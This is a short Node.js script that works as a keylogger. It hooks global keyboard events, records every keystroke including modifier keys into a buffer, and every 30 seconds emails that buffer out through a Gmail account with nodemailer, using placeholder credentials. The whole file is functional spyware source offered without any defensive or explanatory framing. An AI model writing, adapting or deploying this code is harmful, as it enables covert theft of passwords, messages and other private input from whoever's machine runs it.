var GlobalKeyboardListener = require("node-global-key-listener").GlobalKeyboardListener;
var nodemailer = require('nodemailer');
const util = require('util');
const v = new GlobalKeyboardListener();

var transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: '@gmail.com',
    pass: 'password'
  }
});


let capturedOutput = '';

v.addListener(function (e) {
    if (e.state == "DOWN") {
      if (e.name == "a" || e.name == "b" || e.name == "c" || e.name == "d" || e.name == "e" ||
      e.name == "f" || e.name == "g" || e.name == "h" || e.name == "i" || e.name == "j" ||
      e.name == "k" || e.name == "l" || e.name == "m" || e.name == "n" || e.name == "o" ||
      e.name == "p" || e.name == "q" || e.name == "r" || e.name == "s" || e.name == "t" ||
      e.name == "u" || e.name == "v" || e.name == "w" || e.name == "x" || e.name == "y" ||
      e.name == "z" || e.name == "A" || e.name == "B" || e.name == "C" || e.name == "D" ||
      e.name == "E" || e.name == "F" || e.name == "G" || e.name == "H" || e.name == "I" ||
      e.name == "J" || e.name == "K" || e.name == "L" || e.name == "M" || e.name == "N" ||
      e.name == "O" || e.name == "P" || e.name == "Q" || e.name == "R" || e.name == "S" ||
      e.name == "T" || e.name == "U" || e.name == "V" || e.name == "W" || e.name == "X" ||
      e.name == "Y" || e.name == "Z" || e.name == "0" || e.name == "1" || e.name == "2" ||
      e.name == "3" || e.name == "4" || e.name == "5" || e.name == "6" || e.name == "7" ||
      e.name == "8" || e.name == "9"){
        capturedOutput += (`${e.name}`);
      }
      else if (e.state == "DOWN" && e.name == "SPACE"){
        capturedOutput += (` `);
      }
      else if (e.name == "DOT"){
        capturedOutput += (`.`);
      }
      else if (e.name == "LEFT ALT" || e.name == "RIGHT ALT" || e.name == "LEFT SHIFT" || 
      e.name == "RIGHT SHIFT" || e.name == "LEFT CTRL" || e.name == "RIGHT CTRL"){
        capturedOutput += (` <DOWN ${e.name}> `);
      }
      else{
        capturedOutput += (` <${e.name}> `);
      }
    }
    else if (e.state == "UP" &&
    e.name == "LEFT ALT" || e.name == "RIGHT ALT" || e.name == "LEFT SHIFT" || 
    e.name == "RIGHT SHIFT" || e.name == "LEFT CTRL" || e.name == "RIGHT CTRL"){
      capturedOutput += (` <UP ${e.name}> `);
    }

    console.log(capturedOutput);
});


const sendEmailKeyLogs = async () => {
  //await util.promisify(setTimeout)(1000 * 60);
  var mailOptions = {
    from: '@gmail.com',
    to: '@gmail.com',
    subject: 'mail subject',
    text: capturedOutput
  };

  transporter.sendMail(mailOptions, function(error, info){
    if (error) {
      console.log(error);
    } else {
      console.log('Email sent: ' + info.response);
    }
  });

  capturedOutput = ''; //clearing captured Output after sending into the email

};

setInterval(sendEmailKeyLogs, 1000 * 30);